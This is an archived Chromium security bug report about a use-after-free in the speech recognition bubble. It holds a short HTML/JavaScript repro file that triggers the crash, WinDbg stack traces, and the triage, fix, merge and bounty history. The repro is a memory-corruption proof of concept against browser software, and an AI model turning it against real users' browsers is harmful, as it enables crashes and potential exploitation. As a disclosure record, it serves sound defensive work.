# Security: UaF in SpeechRecognitionBubbleImpl::~SpeechRecognitionBubbleImpl

| Field | Value |
|-------|-------|
| **Issue ID** | [40079127](https://issues.chromium.org/issues/40079127) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>Speech |
| **Platforms** | Windows |
| **Reporter** | ch...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2014-03-15 |
| **Bounty** | $1,000.00 |

## Description

**VERSION**  

Chrome Version : 35.0.1892.2 canary  

Operating System: Windows XP

REPRO FILE:

<input onclick="setTimeout('test()',500)" x-webkit-speech />
<script>
function test()
{
if (document.documentElement.webkitRequestFullScreen) {
document.documentElement.webkitRequestFullScreen();
}
document.addEventListener("webkitfullscreenchange", function () { history.go(-1)}, true);

}  

</script>

<script defer=defer>
if(history.length==1){
setTimeout('window.location = document.location + "?new"',10);
}
</script>

Crash State:  

012fa78 02fa4583 chrome\_1c50000!`anonymous namespace'::SpeechRecognitionBubbleImpl::~SpeechRecognitionBubbleImpl+0x1c [c:\b\build\slave\win\build\src\chrome\browser\ui\views\speech_recognition_bubble_views.cc @ 362] 0012fa84 025bc2a2 chrome_1c50000!`anonymous namespace'::SpeechRecognitionBubbleImpl::`scalar deleting destructor'+0xb  

0012fac4 01cfdd91 chrome\_1c50000!speech::SpeechRecognitionBubbleController::ProcessRequestInUiThread+0xab [c:\b\build\slave\win\build\src\chrome\browser\speech\speech\_recognition\_bubble\_controller.cc @ 199]  

0012fad4 01cb0f9c chrome\_1c50000!base::internal::Invoker<2,base::internal::BindState<base::internal::RunnableAdapter<bool (\_\_thiscall history::ShortcutsDatabase::\*)(std::basic\_string<char,std::char\_traits<char>,std::allocator<char> > const &)>,void \_\_cdecl(history::ShortcutsDatabase \*,std::basic\_string<char,std::char\_traits<char>,std::allocator<char> > const &),void \_\_cdecl(history::ShortcutsDatabase \*,std::basic\_string<char,std::char\_traits<char>,std::allocator<char> >)>,void \_\_cdecl(history::ShortcutsDatabase \*,std::basic\_string<char,std::char\_traits<char>,std::allocator<char> > const &)>::Run+0x16 [c:\b\build\slave\win\build\src\base\bind\_internal.h @ 1253]  

0012fb6c 01caff4d chrome\_1c50000!base::MessageLoop::RunTask+0x29d [c:\b\build\slave\win\build\src\base\message\_loop\message\_loop.cc @ 451]  

0012fcb0 01d2c55b chrome\_1c50000!base::MessageLoop::DoWork+0x367 [c:\b\build\slave\win\build\src\base\message\_loop\message\_loop.cc @ 576]  

0012fcdc 01cafa12 chrome\_1c50000!base::MessagePumpForUI::DoRunLoop+0x5f [c:\b\build\slave\win\build\src\base\message\_loop\message\_pump\_win.cc @ 219]  

0012fd84 01ecf92d chrome\_1c50000!base::MessageLoop::StartHistogrammer+0xa7 [c:\b\build\slave\win\build\src\base\message\_loop\message\_loop.cc @ 545]  

0012fd98 01ecf8f5 chrome\_1c50000!content::BrowserMainLoop::RunMainMessageLoopParts+0x2d [c:\b\build\slave\win\build\src\content\browser\browser\_main\_loop.cc @ 723]  

0012fda8 01c705d4 chrome\_1c50000!content::BrowserMainRunnerImpl::Run+0x13 [c:\b\build\slave\win\build\src\content\browser\browser\_main\_runner.cc @ 118]  

0012fdd8 01c703bb chrome\_1c50000!content::BrowserMain+0x83 [c:\b\build\slave\win\build\src\content\browser\browser\_main.cc @ 26]  

0012fdec 01c70337 chrome\_1c50000!content::RunNamedProcessTypeMain+0x61 [c:\b\build\slave\win\build\src\content\app\content\_main\_runner.cc @ 466]  

0012fe50 01c5c89a chrome\_1c50000!content::ContentMainRunnerImpl::Run+0x64 [c:\b\build\slave\win\build\src\content\app\content\_main\_runner.cc @ 779]  

0012fe60 01c5c2d4 chrome\_1c50000!content::ContentMain+0x23 [c:\b\build\slave\win\build\src\content\app\content\_main.cc @ 19]  

0012fea0 00427c91 chrome\_1c50000!ChromeMain+0x3e [c:\b\build\slave\win\build\src\chrome\app\chrome\_main.cc @ 49]  

0012ff30 004276bc chrome!MainDllLoader::Launch+0x15f [c:\b\build\slave\win\build\src\chrome\app\client\_util.cc @ 315]  

0012ff74 00449ac5 chrome!wWinMain+0x50 [c:\b\build\slave\win\build\src\chrome\app\chrome\_exe\_main\_win.cc @ 103]

## Attachments

- [testcase.avi](attachments/testcase.avi) (application/octet-stream, 3.2 MB)
- [Speech API Crash Video.avi](attachments/Speech API Crash Video.avi) (application/octet-stream, 3.2 MB)

## Timeline

### ch...@gmail.com (2014-03-15)

[Empty comment from Monorail migration]

### in...@chromium.org (2014-03-17)

What are the repro steps ? Does it need user interaction like mouse click, etc?

### ch...@gmail.com (2014-03-17)

inferno@ There are no steps to repro, just click on the Speech.

### ch...@gmail.com (2014-03-17)

This crash can take several tries to repro.

### cl...@chromium.org (2014-03-18)

tommyw@: Can you please take a look or find someone else to own it.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-03-18)

[Empty comment from Monorail migration]

### rs...@chromium.org (2014-03-18)

khalil: Based on the version in which you reported this, I don't think this was fixed by https://crbug.com/chromium/330660.

Were you able to reproduce this on either the stable or beta versions of Chrome (which include fixes for that bug, too)?

### ch...@gmail.com (2014-03-18)

rsesek@: Yes, I can reproduce this bug on the latest version of canary (35.0.1897.2) and stable (33.0.1750.154 ), but only on my slowly machine (Windows XP).

### ch...@gmail.com (2014-03-18)

I've recorded a demo showing how I repro this crash on canary http://youtu.be/yR3i805Irmw

### ch...@gmail.com (2014-03-19)

eax=f9559fe6 ebx=00000000 ecx=06aa6700 edx=035bf840 esi=05e24660 edi=01105ea0
eip=0290f59a esp=0012f97c ebp=0012f988 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206
chrome_1c30000!`anonymous namespace'::SpeechRecognitionBubbleImpl::~SpeechRecognitionBubbleImpl+0x1c:
0290f59a ff5074          call    dword ptr [eax+74h]  ds:0023:f955a05a=????????
0:000> k
  *** Stack trace for last set context - .thread/.cxr resets it
ChildEBP RetAddr  
0012f97c 0290f969 chrome_1c30000!`anonymous namespace'::SpeechRecognitionBubbleImpl::~SpeechRecognitionBubbleImpl+0x1c [c:\b\build\slave\win\build\src\chrome\browser\ui\views\speech_recognition_bubble_views.cc @ 351]
0012f988 022e98a7 chrome_1c30000!`anonymous namespace'::SpeechRecognitionBubbleImpl::`scalar deleting destructor'+0xb
0012f9c4 01cc78f6 chrome_1c30000!speech::SpeechRecognitionBubbleController::ProcessRequestInUiThread+0xa8 [c:\b\build\slave\win\build\src\chrome\browser\speech\speech_recognition_bubble_controller.cc @ 200]
0012f9d4 01c88985 chrome_1c30000!base::internal::Invoker<2,base::internal::BindState<base::internal::RunnableAdapter<void (__thiscall invalidation::InvalidationClientImpl::*)(invalidation::ObjectId const &)>,void __cdecl(invalidation::InvalidationClientImpl *,invalidation::ObjectId const &),void __cdecl(base::internal::UnretainedWrapper<invalidation::InvalidationClientImpl>,invalidation::ObjectId)>,void __cdecl(invalidation::InvalidationClientImpl *,invalidation::ObjectId const &)>::Run+0x16 [c:\b\build\slave\win\build\src\base\bind_internal.h @ 1253]
0012faa0 01c88029 chrome_1c30000!base::MessageLoop::RunTask+0x56d [c:\b\build\slave\win\build\src\base\message_loop\message_loop.cc @ 513]
0012fbf0 01cf536d chrome_1c30000!base::MessageLoop::DoWork+0x301 [c:\b\build\slave\win\build\src\base\message_loop\message_loop.cc @ 638]
0012fc1c 01ca4c53 chrome_1c30000!base::MessagePumpForUI::DoRunLoop+0x5c [c:\b\build\slave\win\build\src\base\message_loop\message_pump_win.cc @ 219]
0012fcc0 01ec26e4 chrome_1c30000!PrefService::SetUserPrefValue+0xd9 [c:\b\build\slave\win\build\src\base\prefs\pref_service.cc @ 455]
0012fcd4 01ec26ae chrome_1c30000!content::BrowserMainLoop::RunMainMessageLoopParts+0x2d [c:\b\build\slave\win\build\src\content\browser\browser_main_loop.cc @ 730]
0012fce4 01c4ea8a chrome_1c30000!content::BrowserMainRunnerImpl::Run+0x13 [c:\b\build\slave\win\build\src\content\browser\browser_main_runner.cc @ 123]
0012fd1c 01c4e862 chrome_1c30000!content::BrowserMain+0x99 [c:\b\build\slave\win\build\src\content\browser\browser_main.cc @ 26]
0012fd30 01c4e7e4 chrome_1c30000!content::RunNamedProcessTypeMain+0x5d [c:\b\build\slave\win\build\src\content\app\content_main_runner.cc @ 472]
0012fd9c 01c3aa9b chrome_1c30000!content::ContentMainRunnerImpl::Run+0x85 [c:\b\build\slave\win\build\src\content\app\content_main_runner.cc @ 791]
0012fdac 01c3a4e0 chrome_1c30000!content::ContentMain+0x29 [c:\b\build\slave\win\build\src\content\app\content_main.cc @ 35]
0012fde4 00428677 chrome_1c30000!ChromeMain+0x2b [c:\b\build\slave\win\build\src\chrome\app\chrome_main.cc @ 34]
0012fe84 004288d3 chrome!MainDllLoader::Launch+0x161 [c:\b\build\slave\win\build\src\chrome\app\client_util.cc @ 301]
0012fee8 00428956 chrome!`anonymous namespace'::RunChrome+0xd7 [c:\b\build\slave\win\build\src\chrome\app\chrome_exe_main_win.cc @ 68]
0012ff30 00447e9f chrome!wWinMain+0x6c [c:\b\build\slave\win\build\src\chrome\app\chrome_exe_main_win.cc @ 139]
0012ffc0 7c817067 chrome!__tmainCRTStartup+0x11a [f:\dd\vctools\crt_bld\self_x86\crt\src\crt0.c @ 275]

### rs...@chromium.org (2014-03-19)

Thanks. I was not able to reproduce this on OS X, FWIW. This bug is similar in nature to https://crbug.com/chromium/330660 but does require a small amount of user interaction (have to click the speech mic icon), so I'm going to do an initial Severity of Medium.

### cl...@chromium.org (2014-03-20)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-03-26)

tommyw@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### [Deleted User] (2014-03-26)

[Empty comment from Monorail migration]

### bu...@chromium.org (2014-04-04)

------------------------------------------------------------------
r261737 | tommyw@chromium.org | 2014-04-04T13:48:25.464526Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/ui/views/speech_recognition_bubble_views.cc?r1=261737&r2=261736&pathrev=261737

Fixing a lifetime issue for Speech Recognition Bubble
It seems that on a slow XP machine the view can be deleted before the
Impl. Fixed by a simple observer pattern.

BUG=352851

Review URL: https://codereview.chromium.org/213153002
-----------------------------------------------------------------

### in...@chromium.org (2014-04-04)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-04-04)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### ch...@gmail.com (2014-04-08)

Is this report qualified for a reward?

### in...@chromium.org (2014-04-08)

Chromium.Khalil@, we automatically add reward-topanel label when we are near a release. This is a recently fixed bug, please be patient.

### ti...@chromium.org (2014-04-17)

Merge-Approved for M34 (via dxie@)

Merge-Requested for M35.

### in...@chromium.org (2014-04-17)

merged to m34 in r264644

### bu...@chromium.org (2014-04-17)

------------------------------------------------------------------
r264644 | inferno@chromium.org | 2014-04-17T21:32:45.778846Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/branches/1847/src/chrome/browser/ui/views/speech_recognition_bubble_views.cc?r1=264644&r2=264643&pathrev=264644

Merge 261737 "Fixing a lifetime issue for Speech Recognition Bubble"

> Fixing a lifetime issue for Speech Recognition Bubble
> It seems that on a slow XP machine the view can be deleted before the
> Impl. Fixed by a simple observer pattern.
> 
> BUG=352851
> 
> Review URL: https://codereview.chromium.org/213153002

TBR=tommyw@chromium.org

Review URL: https://codereview.chromium.org/240223010
-----------------------------------------------------------------

### ti...@chromium.org (2014-04-17)

Merge-Requested for M35.


### ka...@google.com (2014-04-21)

let's bake a bit more.

### ka...@google.com (2014-04-21)

ah nm i saw the wrong merge.

### ti...@chromium.org (2014-04-22)

Tommy - please merge into M35 (branch 1916).

### ke...@chromium.org (2014-04-24)

[Empty comment from Monorail migration]

### in...@chromium.org (2014-04-25)

We forgot to remove m34 label.

Dev not responding to merge request, i merged to m35 in r266126

### bu...@chromium.org (2014-04-25)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/3e1316a8675b9e6e1047698d32da41ea8642a9d5

commit 3e1316a8675b9e6e1047698d32da41ea8642a9d5
Author: inferno@chromium.org <inferno@chromium.org@0039d316-1c4b-4281-b951-d872f2087c98>
Date: Fri Apr 25 04:03:48 2014 +0000

Merge 261737 "Fixing a lifetime issue for Speech Recognition Bubble"

> Fixing a lifetime issue for Speech Recognition Bubble
> It seems that on a slow XP machine the view can be deleted before the
> Impl. Fixed by a simple observer pattern.
> 
> BUG=352851
> 
> Review URL: https://codereview.chromium.org/213153002

TBR=tommyw@chromium.org

Review URL: https://codereview.chromium.org/254773002

git-svn-id: svn://svn.chromium.org/chrome/branches/1916/src@266126 0039d316-1c4b-4281-b951-d872f2087c98



### bu...@chromium.org (2014-04-25)

------------------------------------------------------------------
r266126 | inferno@chromium.org | 2014-04-25T04:03:48.174336Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/branches/1916/src/chrome/browser/ui/views/speech_recognition_bubble_views.cc?r1=266126&r2=266125&pathrev=266126

Merge 261737 "Fixing a lifetime issue for Speech Recognition Bubble"

> Fixing a lifetime issue for Speech Recognition Bubble
> It seems that on a slow XP machine the view can be deleted before the
> Impl. Fixed by a simple observer pattern.
> 
> BUG=352851
> 
> Review URL: https://codereview.chromium.org/213153002

TBR=tommyw@chromium.org

Review URL: https://codereview.chromium.org/254773002
-----------------------------------------------------------------

### ti...@chromium.org (2014-04-26)

Congrats - $1000 for this one.

### ch...@gmail.com (2014-04-26)

Oh sounds good, thanks!

### cl...@chromium.org (2014-07-11)

Bulk update: removing view restriction from closed bugs.

### ti...@chromium.org (2014-07-22)

[Empty comment from Monorail migration]

### ti...@chromium.org (2014-09-06)

Processing via our e-payment system can take a few weeks, but reward should be on its way to you. Thanks again for your help!

### ch...@gmail.com (2014-10-20)

[Comment Deleted]

### cl...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/352851?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/348430]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40079127)*
